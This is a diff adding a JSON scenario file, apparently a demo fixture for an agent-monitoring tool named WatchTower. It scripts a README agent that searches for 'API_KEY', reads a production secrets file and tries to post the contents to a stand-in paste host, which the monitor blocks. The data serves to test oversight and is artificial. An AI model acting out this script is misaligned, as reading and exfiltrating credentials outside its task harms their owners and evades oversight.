@@ -1,0 +1,26 @@
+{
+  "id": "out_of_scope",
+  "name": "Out of scope",
+  "tier": "Revoke key",
+  "description": "The README agent opens the deployment secrets file, which has nothing to do with its task, then tries to upload what it read to an outside paste site. WatchTower revokes its gateway key on the first out-of-scope read, so the upload never happens.",
+  "duration_s": 40,
+  "noise_interval_s": [4, 8],
+  "agents": [
+    {"agent_id": "agent-01", "declared_task": "Improve the project README", "owner": "team-docs", "background": [{"action": "data_read", "tool": "github.read_file", "resource": "app/docs/README.md", "detail": "read README"}, {"action": "data_write", "tool": "github.write_file", "resource": "app/docs/README.md", "detail": "tighten intro paragraph"}]},
+    {"agent_id": "agent-02", "declared_task": "Research industry best practices", "owner": "team-research", "background": [{"action": "tool_call", "tool": "web.search", "resource": "web", "detail": "search: agent observability best practices"}]},
+    {"agent_id": "agent-03", "declared_task": "Write the demo video script", "owner": "team-docs", "background": [{"action": "data_write", "tool": "github.write_file", "resource": "app/video/script.md", "detail": "edit demo section"}]},
+    {"agent_id": "agent-04", "declared_task": "Fix failing unit tests", "owner": "team-eng", "background": [{"action": "tool_call", "tool": "ci.run_tests", "resource": "app/tests/", "detail": "run test suite"}, {"action": "data_write", "tool": "github.write_file", "resource": "app/tests/test_api.py", "detail": "fix assertion"}]},
+    {"agent_id": "agent-05", "declared_task": "Summarize customer feedback", "owner": "team-research", "background": [{"action": "data_read", "tool": "github.read_file", "resource": "app/feedback/survey.csv", "detail": "read survey results"}]},
+    {"agent_id": "agent-06", "declared_task": "Draft the pitch deck", "owner": "team-docs", "background": [{"action": "data_write", "tool": "github.write_file", "resource": "app/deck/slides.md", "detail": "add architecture slide"}]},
+    {"agent_id": "agent-07", "declared_task": "Translate docs", "owner": "team-docs", "background": [{"action": "data_write", "tool": "github.write_file", "resource": "app/docs/i18n/ja.md", "detail": "translate section 2"}]},
+    {"agent_id": "agent-08", "declared_task": "Build the dashboard frontend", "owner": "team-eng", "background": [{"action": "data_write", "tool": "github.write_file", "resource": "app/web/App.tsx", "detail": "add risk gauge component"}]},
+    {"agent_id": "agent-09", "declared_task": "Prepare sample data", "owner": "team-eng", "background": [{"action": "data_read", "tool": "github.read_file", "resource": "app/data/sample.json", "detail": "read sample data"}]},
+    {"agent_id": "agent-10", "declared_task": "QA review of deliverables", "owner": "team-qa", "background": [{"action": "data_read", "tool": "github.read_file", "resource": "app/docs/README.md", "detail": "review README"}]}
+  ],
+  "script": [
+    {"t": 8, "agent_id": "agent-01", "action": "data_read", "tool": "github.read_file", "resource": "app/docs/README.md", "detail": "read README"},
+    {"t": 12, "agent_id": "agent-01", "action": "tool_call", "tool": "github.search_code", "resource": "app/", "detail": "search: API_KEY"},
+    {"t": 15, "agent_id": "agent-01", "action": "data_read", "tool": "github.read_file", "resource": "app/config/.env.production", "detail": "read deployment config"},
+    {"t": 18, "agent_id": "agent-01", "action": "tool_call", "tool": "http.post", "resource": "https://paste.example.net/api/new", "detail": "upload notes for later"}
+  ]
+}
